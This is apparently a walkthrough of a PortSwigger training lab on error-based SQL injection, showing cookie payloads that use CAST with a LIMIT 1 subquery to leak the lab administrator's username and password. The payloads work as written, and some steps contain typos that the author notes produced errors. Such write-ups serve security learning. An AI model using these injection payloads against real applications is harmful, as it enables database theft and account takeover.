Hello Hackers , Today i will solve this lab about Error based SQLI in portswigger

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/8767b9fb-d2ec-470f-8c1f-957e495b6828)

This is our Website … Hmm Ok let's play with burp suite

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/971e0a4e-7f37-42b2-80bb-dca5e9822fb3)

We discover that parameter TrackingId Is valnerabled So We add ' after value

```
TrackingId=qBRYuM0Pvt1jAt0S';
```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/6a7c89f8-a681-4d91-9b85-66182da252ec)


OK , Now we got error based 
Lets go using ``` ' AND 1=1--```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/88248994-aef1-4068-bdab-57aa023a8136)

Ok we will replace second value 1 to CAST 
> CAST convert string to int if username or password was int we can discover this data.

We will using :

```' AND 1=CAST((SELCET 1)AS INT)--```

Replace this:

``` ' AND 1=1--```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/2bc6f5d0-2102-4827-9cbe-3a1cedeefb18)


We replace ```SELECT 1``` To our query to discover data.

```SELECT username FROM users```

we added in our payload:

```' AND 1=CAST((SELECT username FROM user)AS INT)--```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/4a7a2362-1f88-4a94-93ee-7c9f6c7fa1bb)


Ooops error!!


Hmm Let's try clear value of 


```TrackingId=qBRYuM0Pvt1jAt0S;```

```
TrackingId=' AND 1=CAST((SELECT username FROM users)AS INT)--;
```


![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/407150a6-e66c-45dc-a6d7-1d5efc39ba18)


Now We will add LIMIT 1 in end payload such as :


```
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1)AS INT)--;
```
![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/d10f9bb7-6d03-48f2-bbeb-afa6a64e7b76)


WOOW we got on username ```administrator```

We will previos payload but must change ***username*** to **password**


```
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1)AS INT)--;
```

![image](https://github.com/4bo4yman/Web-Application-Penetration-Testing/assets/156849852/da7f0652-6905-4d00-b1ad-4ca07ede2621)

Woow we got account of admin ```administrator:r8hyg8bb23cfaaowe98l```




